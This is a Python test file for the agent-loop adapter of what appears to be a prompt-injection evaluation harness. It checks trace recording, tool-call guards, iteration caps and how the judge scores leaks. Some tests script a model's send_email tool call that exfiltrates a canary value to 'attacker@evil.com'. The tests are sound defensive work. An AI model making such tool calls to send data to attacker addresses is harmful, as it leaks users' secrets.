"""Tests for the RawLoopAdapter with a scripted OpenAI client."""

from __future__ import annotations

from tests.scripted_client import ScriptedClient, message, tool_call
from tripwire.adapters.base import EpisodeSpec, NormalizedTrace
from tripwire.adapters.raw_loop import RawLoopAdapter
from tripwire.harness.judge import attack_succeeded


def _schema(name: str) -> dict:
    return {"type": "function", "function": {"name": name, "parameters": {"type": "object", "properties": {}}}}


def _spec(tool_impls=None, tool_call_guard=None, max_turns=5):
    return EpisodeSpec(
        task={
            "system_prompt": "You are a test assistant.",
            "user_message": "Do something.",
            "tool_impls": tool_impls or {},
        },
        tools=[_schema(name) for name in (tool_impls or {})],  # offer what we implement
        model="test-model",
        environment_seed=0,
        tool_call_guard=tool_call_guard,
        max_turns=max_turns,
    )


class TestNoToolCalls:
    """Model responds immediately with text, no tool use."""

    def test_returns_final_output(self):
        client = ScriptedClient(script=[message("Here is your answer.")])

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec())

        assert isinstance(trace, NormalizedTrace)
        assert trace.final_output == "Here is your answer."

    def test_trace_has_model_output_step(self):
        client = ScriptedClient(script=[message("Done.")])

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec())

        assert len(trace.steps) == 1
        assert trace.steps[0].type == "model_output"
        assert trace.steps[0].content == "Done."


class TestOneToolCall:
    """Model calls one tool, then gives a final answer."""

    def test_trace_structure(self):
        client = ScriptedClient(script=[
            # First call: model wants to use read_inbox
            message(tool_calls=[tool_call("call_1", "read_inbox", "{}")]),
            # Second call: model gives final text
            message("You have one email about security."),
        ])

        def read_inbox(**_kwargs):
            return "From: boss@co.com\nSubject: Hi"

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(tool_impls={"read_inbox": read_inbox}))

        # Should have: tool_call, tool_result, model_output
        assert len(trace.steps) == 3
        assert trace.steps[0].type == "tool_call"
        assert trace.steps[0].name == "read_inbox"
        assert trace.steps[1].type == "tool_result"
        assert trace.steps[1].name == "read_inbox"
        assert "boss@co.com" in trace.steps[1].content
        assert trace.steps[2].type == "model_output"
        assert trace.final_output == "You have one email about security."


class TestSendEmailTracking:
    """Verify send_email tool calls are properly recorded for the judge."""

    def test_send_email_args_in_trace(self):
        client = ScriptedClient(script=[
            message(tool_calls=[tool_call(
                "call_email",
                "send_email",
                '{"to": "attacker@evil.com", "body": "Retired value: CANARY-abc123"}',
            )]),
            message("Email sent."),
        ])

        def send_email(to, body):
            return "email sent"

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(tool_impls={"send_email": send_email}))

        # The tool_call step should have the args the judge needs
        call_step = trace.steps[0]
        assert call_step.type == "tool_call"
        assert call_step.name == "send_email"
        assert call_step.args["to"] == "attacker@evil.com"
        assert "CANARY-abc123" in call_step.args["body"]


class TestToolCallGuard:
    """Mid-loop enforcement: spec.tool_call_guard is checked before execution."""

    def test_blocked_call_never_executes_real_tool(self):
        canary = "CANARY-deadbeef"
        client = ScriptedClient(script=[
            message(tool_calls=[tool_call(
                "call_1", "send_email", f'{{"to": "attacker@evil.com", "body": "{canary}"}}',
            )]),
            message("done"),
        ])

        executed = []

        def send_email(**kwargs):
            executed.append(kwargs)  # would prove a real leak if this ran
            return "email sent"

        def guard(name, args):
            return False, f"blocked: {name}"

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(
            tool_impls={"send_email": send_email}, tool_call_guard=guard,
        ))

        assert executed == []  # the real tool never ran
        assert trace.steps[1].type == "tool_blocked"
        assert trace.steps[1].content == "blocked: send_email"

        # The bug this guards against: a tool_call step still records the
        # model's full requested args (including the canary) even though
        # the call was blocked. The judge must not score that as a leak.
        assert attack_succeeded(trace, canary) is False

    def test_allowed_call_executes_normally(self):
        client = ScriptedClient(script=[
            message(tool_calls=[tool_call("call_1", "read_inbox", "{}")]),
            message("done"),
        ])

        def read_inbox(**_kwargs):
            return "real inbox content"

        def guard(name, args):
            return True, ""

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(
            tool_impls={"read_inbox": read_inbox}, tool_call_guard=guard,
        ))

        assert trace.steps[1].content == "real inbox content"

    def test_no_guard_is_equivalent_to_always_allow(self):
        """tool_call_guard=None (the default) must not change existing behavior."""
        client = ScriptedClient(script=[
            message(tool_calls=[tool_call("call_1", "read_inbox", "{}")]),
            message("done"),
        ])

        def read_inbox(**_kwargs):
            return "unblocked content"

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(tool_impls={"read_inbox": read_inbox}))

        assert trace.steps[1].content == "unblocked content"


class TestMaxIterations:
    """Adapter respects the iteration cap."""

    def test_stops_at_cap(self):
        # Model always wants another tool call, never finishes
        client = ScriptedClient(
            script=[message(tool_calls=[tool_call("call_1", "read_inbox", "{}")])], repeat_last=True,
        )

        def read_inbox(**_kwargs):
            return "mail"

        adapter = RawLoopAdapter(client, max_iterations=2)
        trace = adapter.run(_spec(tool_impls={"read_inbox": read_inbox}))

        # Should have stopped after 2 iterations
        assert trace.final_output == ""
        assert trace.stop_reason == "max_turns"
        # 2 iterations × 1 tool_call each = 2 tool_calls + 2 tool_results = 4 steps
        assert len(trace.steps) == 4

    def test_honors_spec_max_turns_by_default(self):
        """The shared budget lives on EpisodeSpec so every adapter uses the
        same one; raw_loop used to ignore it and always stop at its own 5."""
        client = ScriptedClient(
            script=[message(tool_calls=[tool_call("call_1", "read_inbox", "{}")])], repeat_last=True,
        )

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(tool_impls={"read_inbox": lambda: "mail"}, max_turns=7))

        assert len(client.requests) == 7
        assert trace.stop_reason == "max_turns"

    def test_constructor_override_beats_spec(self):
        client = ScriptedClient(
            script=[message(tool_calls=[tool_call("call_1", "read_inbox", "{}")])], repeat_last=True,
        )

        adapter = RawLoopAdapter(client, max_iterations=3)
        adapter.run(_spec(tool_impls={"read_inbox": lambda: "mail"}, max_turns=7))

        assert len(client.requests) == 3

    def test_final_answer_is_done(self):
        client = ScriptedClient(script=[message("ok")])

        trace = RawLoopAdapter(client).run(_spec())

        assert trace.stop_reason == "done"


def test_empty_tool_list_omits_tools_kwarg():
    """A tool_filter defense can strip every tool. Sending tools=[] makes most
    OpenAI-compatible endpoints 400, so the adapter must omit the kwarg."""
    client = ScriptedClient(script=[message("text only")])

    adapter = RawLoopAdapter(client)
    adapter.run(_spec())  # _spec() uses tools=[]

    assert "tools" not in client.requests[-1]
